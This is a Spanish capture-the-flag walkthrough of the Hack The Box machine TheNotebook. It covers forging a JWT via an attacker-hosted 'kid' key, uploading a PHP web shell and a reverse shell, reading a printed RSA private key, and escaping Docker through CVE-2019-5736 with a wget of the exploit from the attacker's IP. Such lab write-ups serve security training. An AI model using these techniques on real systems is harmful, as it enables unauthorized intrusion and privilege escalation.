---
title: TheNotebook (Hack The Box)
author: J0lm3d0
date: 2021-07-31 21:00:00 +0200
categories: [HackTheBox]
tags: [linux, json, jwt, cookie_hijacking, sudo, docker, cve]
pin: false
---

En este documento se recogen los pasos a seguir para la resolución de la máquina TheNotebook de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de resolución según la plataforma.

![Logo de la máquina](/assets/img/HTB/TheNotebook/machine.png)

[Write-up en PDF realizado mediante LaTeX](/pdfs/Write_up_TheNotebook.pdf)

## Enumeración de servicios y recopilación de información sensible

Lo primero a realizar es un escaneo de todo el rango de puertos TCP mediante la herramienta `Nmap`.

```bash
# nmap -p- --open -T5 -n -vv 10.10.10.230

Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Tras obtener los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.

```bash
# nmap -p 22,80 -sC -sV 10.10.10.230

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Como no dispongo de ninguna credencial para acceder a la máquina mediante SSH, comienzo enumerando el servidor web. Al acceder a la IP a través del navegador, me encuentro la siguiente página:

![Página principal del servidor web](/assets/img/HTB/TheNotebook/indexpage.png)

Por lo que parece, el servidor web tiene una plataforma personalizada para registrar notas y, según el texto, puedo registrarme. Al acceder a la pagina de registro se observa un formulario en el que hay que rellenar los siguientes campos para llevar a cabo el registro:

![Página de registro del servidor web](/assets/img/HTB/TheNotebook/registerpage.png)

Consigo registrarme utilizando "test2" como nombre de usuario y "test2@test.com" como correo electrónico (el usuario "test" ya estaba en uso). Ahora, accedo a la pagina de "login" para entrar a la plataforma con el usuario creado:

![Página de "login" del servidor web](/assets/img/HTB/TheNotebook/loginpage.png)

Una vez entro, veo el panel de usuario, en el que indica que se puede acceder a la sección de notas para registrar nuevas notas o ver las que tengamos registradas:

![Panel principal del usuario de la plataforma web](/assets/img/HTB/TheNotebook/userpage.png)

Al acceder a la sección de notas no veo nada, ya que mi usuario es nuevo y aún no he creado ninguna nueva nota:

![Página de notas de la plataforma web](/assets/img/HTB/TheNotebook/notespage.png)

Al poder registrar texto en la plataforma web, se me ocurre probar algunas inyecciones (SSTI, XSS...) para comprobar si el servidor es vulnerable y así poder aprovecharlo de alguna forma para obtener información sensible y/o conseguir acceso, pero no parece que presente vulnerabilidad alguna.

![Inyecciones intentadas en las notas de la plataforma web](/assets/img/HTB/TheNotebook/injectionstried.png)

Al no encontrar nada relacionado a inyecciones, pruebo a enumerar directorios y/o ficheros ocultos mediante `Gobuster`, pero no obtengo ningún resultado que no conociese ya.

```
# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.230
/login                (Status: 200) [Size: 1250]
/register             (Status: 200) [Size: 1422]
/admin                (Status: 403) [Size: 9]   
/logout               (Status: 302) [Size: 209] [--> http://10.10.10.230/]
```

Probando peticiones mediante BurpSuite, observo que al acceder a la plataforma, se me asigna una cookie de autenticación.

![Cookie de autenticación asignada al acceder a la plataforma web](/assets/img/HTB/TheNotebook/authcookie.png)

Tras analizar la cookie, compruebo que se trata de un JWT (JSON Web Token), formado principalmente por 3 campos, que se diferencian al estar separados por puntos:

1. Header. Está codificado en base64 y al descodificarlo se puede observar una estructura JSON.
2. Payload. Está codificado en base64 y al descodificarlo se puede observar una estructura JSON.
3. Signature. Se utiliza para verificar si el token ha sido firmado y si ha sido alterado de alguna forma. Se puede crear de varias formas, en función del algoritmo de encriptación que se defina.

Por tanto, procedo a decodificar los campos header y payload, para obtener los valores en texto claro.

```json
# echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9" | base64 -d | jq
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}
# echo "eyJ1c2VybmFtZSI6InRlc3QyIiwiZW1haWwiOiJ0ZXN0MkB0ZXN0LmNvbSIsImFkbWluX2NhcCI6MH0" | base64 -d | jq
{
  "username": "test2",
  "email": "test2@test.com",
  "admin_cap": false
}
```

En este caso, en el header se observa que el token utiliza el algoritmo `RS256`, por lo que el campo Signature se crearía de la siguiente forma:

1. El hash SHA-256 de la concatenación de: Header en Base64 + "." + Payload en Base 64.
2. La encriptación del hash SHA-256 mediante RSA y una clave privada.
3. El codificado en Base64 del resultado obtenido en el paso anterior.


## Acceso a la máquina

Con los datos que aparecen en las estructuras JSON, se me ocurre una forma de falsear la cookie, obteniendo permisos de administrador en la plataforma. Se tendrían que modificar los valores de los campos `kid` del header, apuntando a una clave privada que generare en mi máquina, y `admin_cap` del payload, cambiando el "false" por un "true", lo que seguramente nos proporcionaría capacidades de administración en la plataforma.

```
# echo "{\"typ\":\"JWT\",\"alg\":\"RS256\",\"kid\":\"http://10.10.14.61:7070/privKey.key\"}" | base64
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yMjE6NzA3
MC9wcml2S2V5LmtleSJ9Cg==

# echo "{\"username\":\"test2\",\"email\":\"test2@test.com\",\"admin_cap\":true}" | base64
eyJ1c2VybmFtZSI6InRlc3QyIiwiZW1haWwiOiJ0ZXN0MkB0ZXN0LmNvbSIsImFkbWluX2NhcCI6
dHJ1ZX0K

# openssl genrsa -out privKey.key
Generating RSA private key, 2048 bit long modulus (2 primes)
..........+++++
...................................+++++
e is 65537 (0x010001)
```

Con la ayuda del debugger de [jwt.io](https://jwt.io) construyo el token que contendrá el valor de la nueva cookie. Para ello, copio el header modificado en Base64, seguido del payload modificado en Base64 (separando estos 2 campos mediante un punto). Una vez hecho esto, copio la clave privada que he generado mediante `OpenSSL` en el campo de texto correspondiente y, automáticamente, realizará las operaciones que he mencionado anteriormente para añadir el campo signature (los caracteres que aparecen en azul turquesa en la imagen) al token que estaba construyendo, dando así por finalizada su creación.

![Construcción del JSON Web Token en jwt.io](/assets/img/HTB/TheNotebook/buildingtoken.png)

Para llevar a cabo la explotación, solo hay que montar un servidor HTTP en el puerto 7070 y en el directorio en el que se encuentra la clave privada, ya que es donde he apuntado en el campo `kid` del header. Una vez que este el servidor a la escucha de peticiones, cambio el valor de la cookie mediante un add-on de Firefox de edición de cookies y recargo la pagina, obteniendo así acceso al "Admin Panel". Indicar también que se debe dejar el servidor del puerto 7070 a la escucha, ya que con cada petición que realicemos se intentará validar la clave privada.

![Panel de administrador de la plataforma web](/assets/img/HTB/TheNotebook/adminpanel.png)

Como se puede ver en la imagen, la plataforma permite a los administradores subir archivos. Para comenzar, probaré a subir una shell en formato .php para comprobar si existe alguna restricción o similar que no permita la subida de este tipo de ficheros

![Ejecución de comandos a través de la web shell subida al servidor web](/assets/img/HTB/TheNotebook/phpshell.png)

Tras subir la shell, compruebo que funciona correctamente y contamos con ejecución de comandos en la máquina víctima con un usuario no privilegiado. Utilizando algunas sentencias de Python3, me envío una shell a mi máquina de atacante para así trabajar de una forma más cómoda en la escalada de privilegios.

## Escalada de privilegios

### Usuario noah

Una vez obtengo la reverse shell, comienzo a enumerar el servidor Linux para escalar privilegios. Al revisar el fichero `/etc/passwd` observo que existe un usuario "noah", al que seguramente tengamos que escalar antes de convertirnos en root.

```
www-data@thenotebook:/var/backups$ cat /etc/passwd | grep "sh$"

root:x:0:0:root:/root:/bin/bash
noah:x:1000:1000:Noah:/home/noah:/bin/bash
```

Continuando con la enumeración del sistema, encuentro en la ruta `/tmp` un comprimido `home.tar.gz`, que podría ser un backup del directorio `/home` de la máquina víctima. Tras descomprimirlo, parece que estaba en lo correcto, ya que observo el directorio de "noah".

```
www-data@thenotebook:/tmp$ ls -la

total 52
drwxrwxrwt 10 root     root     4096 Jul 31 12:42 .
drwxr-xr-x 24 root     root     4096 Jul 31 07:03 ..
drwxrwxrwt  2 root     root     4096 Jul 30 22:57 .ICE-unix
drwxrwxrwt  2 root     root     4096 Jul 30 22:57 .Test-unix
drwxrwxrwt  2 root     root     4096 Jul 30 22:57 .X11-unix
drwxrwxrwt  2 root     root     4096 Jul 30 22:57 .XIM-unix
drwxrwxrwt  2 root     root     4096 Jul 30 22:57 .font-unix
drwxrwxrwx  3 www-data www-data 4096 Jul 31 10:47 az
-rw-r--r--  1 www-data www-data  128 Jul 31 10:42 ftpscr
-rw-r--r--  1 www-data www-data 4373 Jul 31 10:41 home.tar.gz
drwx------  3 root     root     4096 Jul 30 22:57 systemd-private-28b58b6239ef4f21800a78fb6d03b283-systemd-timesyncd.service-PiwWLY
drwx------  2 root     root     4096 Jul 30 22:57 vmware-root_812-2957648972

www-data@thenotebook:/tmp$ tar -xf home.tar.gz 

www-data@thenotebook:/tmp$ ls -la home

total 12
drwxr-xr-x  3 www-data www-data 4096 Feb 12 06:24 .
drwxrwxrwt 11 root     root     4096 Jul 31 12:43 ..
drwxr-xr-x  5 www-data www-data 4096 Feb 17 09:02 noah
www-data@thenotebook:/tmp$ ls -la home/noah/
total 32
drwxr-xr-x 5 www-data www-data 4096 Feb 17 09:02 .
drwxr-xr-x 3 www-data www-data 4096 Feb 12 06:24 ..
-rw-r--r-- 1 www-data www-data  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 www-data www-data 3771 Apr  4  2018 .bashrc
drwx------ 2 www-data www-data 4096 Feb 16 10:47 .cache
drwx------ 3 www-data www-data 4096 Feb 12 06:25 .gnupg
-rw-r--r-- 1 www-data www-data  807 Apr  4  2018 .profile
drwx------ 2 www-data www-data 4096 Feb 17 08:59 .ssh
```

Es posible que el directorio ``.ssh'' contenga una clave privada RSA para así podernos conectar a la máquina víctima por el servicio SSH con el usuario ``noah''. Tras comprobarlo, obtengo la siguiente clave privada:

```
www-data@thenotebook:/tmp$ cat home/noah/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04
HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT
rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b
HVo4kvIHT0IXveAivxez3UpiulFkaQ4zk37rfHO3wuTWsyZ0vmL7gr3fQRBndrUD
v4k2zwetxYNt0hjdLDyA+KGWFFeW7ey9ynrMKW2ic2vBucEAUUe+mb0EazO2inhX
rTAQEgTrbO7jNoZEpf4MDRt7DTQ7dRz+k8HG4wIDAQABAoIBAQDIa0b51Ht84DbH
+UQY5+bRB8MHifGWr+4B6m1A7FcHViUwISPCODg6Gp5o3v55LuKxzPYPa/M0BBaf
Q9y29Nx7ce/JPGzAiKDGvH2JvaoF22qz9yQ5uOEzMMdpigS81snsV10gse1bQd4h
CA4ehjzUultDO7RPlDtbZCNxrhwpmBMjCjQna0R2TqPjEs4b7DT1Grs9O7d7pyNM
Um/rxjBx7AcbP+P7LBqLrnk7kCXeZXbi15Lc9uDUS2c3INeRPmbFl5d7OdlTbXce
YwHVJckFXyeVP6Qziu3yA3p6d+fhFCzWU3uzUKBL0GeJSARxISsvVRzXlHRBGU9V
AuyJ2O4JAoGBAO67RmkGsIAIww/DJ7fFRRK91dvQdeaFSmA7Xf5rhWFymZ/spj2/
rWuuxIS2AXp6pmk36GEpUN1Ea+jvkw/NaMPfGpIl50dO60I0B4FtJbood2gApfG9
0uPb7a+Yzbj10D3U6AnDi0tRtFwnnyfRevS+KEFVXHTLPTPGjRRQ41OdAoGBANlU
kn7eFJ04BYmzcWbupXaped7QEfshGMu34/HWl0/ejKXgVkLsGgSB5v3aOlP6KqEE
vk4wAFKj1i40pEAp0ZNawD5TsDSHoAsIxRnjRM+pZ2bjku0GNzCAU82/rJSnRA+X
i7zrFYhfaKldu4fNYgHKgDBx8X/DeD0vLellpLx/AoGBANoh0CIi9J7oYqNCZEYs
QALx5jilbzUk0WLAnA/eWs9BkVFpQDTnsSPVWscQLqWk7+zwIqq0v6iN3jPGxA8K
VxGyB2tGqt6jI58oPztpabGBTCmBfh82nT2KNNHfwwmfwZjdsu9I9zvo+e3CXlBZ
vglmvw2DW6l0EwX+A+ZuSmiZAoGAb2mgtDMrRDHc/Oul3gvHfV6CYIwwO5qK+Jyr
2WWWKla/qaWo8yPQbrEddtOyBS0BP4yL9s86yyK8gPFxpocJrk3esdT7RuKkVCPJ
z2yn8QE6Rg+yWZpPHqkazSZO1eItzQR2mYG2hzPKFtE7evH6JUrnjm5LTKEreco+
8iCuZAcCgYEA1fhcJzNwEUb2EOV/AI23rYpViF6SiDTfJrtV6ZCLTuKKhdvuqkKr
JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+
Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
-----END RSA PRIVATE KEY-----
```

Con la clave privada obtenida me conecto mediante el servicio SSH y visualizo la flag de usuario no privilegiado en la máquina víctima.

```
# ssh -l noah -i noah_rsa 10.10.10.230

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)
System information as of Sat Jul 31 12:51:41 UTC 2021
Last login: Sat Jul 31 12:51:08 2021 from 10.10.14.61

noah@thenotebook:~$ cat user.txt

d40982b71a3be7b90d5454fb8f5592c2
```

### Usuario administrador (root)

Una vez que he conseguido escalar privilegios al usuario "noah", debo seguir escalando hasta llegar a ser administrador o root. Con el comando `sudo -l` compruebo si puede ejecutarse algún archivo con privilegios de otro usuario o sin proporcionar contraseña. En este caso, se puede ejecutar sin proporcionar contraseña `docker exec -it` seguido del argumento `webapp-dev01` y cualquier comando a ejecutar en dicho contenedor.

```bash
noah@thenotebook:~$ sudo -l

Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

Al acceder al contenedor veo elementos del servidor web: un script en Python para la creación de una base de datos, la clave privada utilizada para la validación del JWT, etc., aunque no aloja el servidor web completo que hemos enumerado y explotado anteriormente.

```
noah@thenotebook:~$ sudo docker exec -it webapp-dev01 bash

root@59146071d204:/opt/webapp# ls -la

total 52
drwxr-xr-x 1 root root 4096 Feb 12 07:30 .
drwxr-xr-x 1 root root 4096 Feb 12 07:30 ..
drwxr-xr-x 1 root root 4096 Feb 12 07:30 __pycache__
drwxr-xr-x 3 root root 4096 Nov 18  2020 admin
-rw-r--r-- 1 root root 3303 Nov 16  2020 create_db.py
-rw-r--r-- 1 root root 9517 Feb 11 15:00 main.py
-rw------- 1 root root 3247 Feb 11 15:09 privKey.key
-rw-r--r-- 1 root root   78 Feb 12 07:12 requirements.txt
drwxr-xr-x 3 root root 4096 Nov 19  2020 static
drwxr-xr-x 2 root root 4096 Nov 18  2020 templates
-rw-r--r-- 1 root root   20 Nov 20  2020 webapp.tar.gz
```

Tras revisar detenidamente el contenedor, no encontré nada que pudiese ayudarme en la escalada de privilegios a root. Pero debido al privilegio que tenemos mediante `sudo`, intuyo que la vía de escalado es esta, por lo que enumero la versión de `docker` y descubro que presenta la vulnerabilidad `CVE-2019-5736` que permite escapar de un contenedor.

```
noah@thenotebook:~$ docker -v

Docker version 18.06.0-ce, build 0ffa825

# searchsploit Docker 18.06

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                             |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
runc < 1.0-rc6 (Docker < 18.09.2) - Container Breakout (1)                                                                                                                                                                                 | linux/local/46359.md
runc < 1.0-rc6 (Docker < 18.09.2) - Container Breakout (2)                                                                                                                                                                                 | linux/local/46369.md
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Abro el segundo documento y observo que se trata de una PoC en la que se detallan los pasos a seguir para explotar la vulnerabilidad y conseguir ejecutar comandos en la máquina anfitrión, lanzando un exploit desde el contenedor de Docker, siempre y cuando `gcc` se encuentre instalado en el contenedor.

![Pasos para explotar la vulnerabilidad CVE-2019-5736](/assets/img/HTB/TheNotebook/46369.png)

En el fichero también se nos indica el [link](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46369.zip) donde descargar el exploit que se utiliza en la PoC. En el comprimido descargado vienen varios archivos. Para especificar el comando que se quiere ejecutar, es necesario modificar la variable "BAD_BINARY" en el fichero `bad_init.sh`.

![Modificación de la variable "BAD_BINARY" en el fichero "bad_init.sh"](/assets/img/HTB/TheNotebook/modifiedpayload.png)

Una vez definido el comando a ejecutar, levanto un servidor HTTP en mi máquina, descargo la carpeta desde el contenedor y doy permisos de ejecución a los ficheros `bad_init.sh` y `make.sh`.

```
root@f1b5fbc04d80:/tmp# wget -r http://10.10.14.221/CVE-2019-5736 && cd CVE-2019-5736/ && chmod +x make.sh bad_init.sh
```

Con esto, solo queda ejecutar el archivo `make.sh`, salir del contenedor e intentar volver a acceder.

```
root@0f4c2517af40:/tmp/CVE-2019-5736# ./make.sh 

+++ dirname ./make.sh
++ readlink -f .
+ cd /tmp/CVE-2019-5736
++ find /lib /lib64 /usr/lib
++ sort -r
++ egrep 'libseccomp\.so'
++ head -n1
+ SECCOMP_TARGET=/usr/lib/x86_64-linux-gnu/libseccomp.so.2.3.3
+ cp ./bad_libseccomp.c ./bad_libseccomp_gen.c
+ awk '($4 == ".text" && $6 == "Base") { print "void", $7 "() {}" }'
+ objdump -T /usr/lib/x86_64-linux-gnu/libseccomp.so.2.3.3
+ cp ./bad_init.sh /bad_init
+ gcc -Wall -Werror -fPIC -shared -rdynamic -o /usr/lib/x86_64-linux-gnu/libseccomp.so.2.3.3 ./bad_libseccomp_gen.c
+ mv /bin/bash /bin/good_bash
+ cat
+ chmod +x /bin/bash

root@0f4c2517af40:/tmp/CVE-2019-5736# exit

exit

noah@thenotebook:~$ sudo docker exec -it webapp-dev01 bash

OCI runtime state failed: unexpected end of JSON input: unknown
```

Este error indica que el exploit ha funcionado y que se debería haber ejecutado el payload definido correctamente.

```
noah@thenotebook:~$ ls -la /bin/bash

-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

Tras comprobar que dispongo de privilegio SUID en el binario de la "bash", lanzo un `bash -p`, obteniendo privilegios de usuario root y pudiendo así visualizar la flag final.

```
noah@thenotebook:~$ bash -p
bash-4.4# id

uid=1000(noah) gid=1000(noah) euid=0(root) groups=1000(noah)

bash-4.4# cat /root/root.txt

377fb1deff3f09bab1a5ee8b3e86a187
```
